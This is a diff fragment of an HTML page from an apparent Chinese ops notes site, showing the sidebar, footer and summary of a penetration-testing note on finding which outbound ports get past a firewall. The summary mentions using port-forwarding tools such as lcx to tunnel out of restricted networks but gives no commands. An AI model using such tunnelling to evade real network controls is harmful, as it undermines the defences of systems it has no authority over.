+          <li><span>来源：02-主机与渗透/03-代理与端口转发/渗透测试之代理.md</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%2B%E4%BB%A3%E7%90%86%E4%B8%8E%E9%9A%A7%E9%81%93%2BLinux%2BWindows-%E5%88%A4%E6%96%AD%E4%BB%80%E4%B9%88%E7%AB%AF%E5%8F%A3%E8%83%BD%E5%87%BA%E6%9D%A5.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>判断什么端口能出来。本文属于网络工程 / 代理与隧道，服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。 对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3…</p>
+      <p>关键词：网络工程、代理与隧道、Linux、Windows、DNS、权限管理、知识笔记、网络工程 / 代理与隧道、判断什么端口能出来</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-6e9461ee3824.html"><small>上一篇</small>一、验证过滤用户的输入</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-5af9050ad5d4.html"><small>下一篇</small>域环境搭建</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ebbad7d3f1f5.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
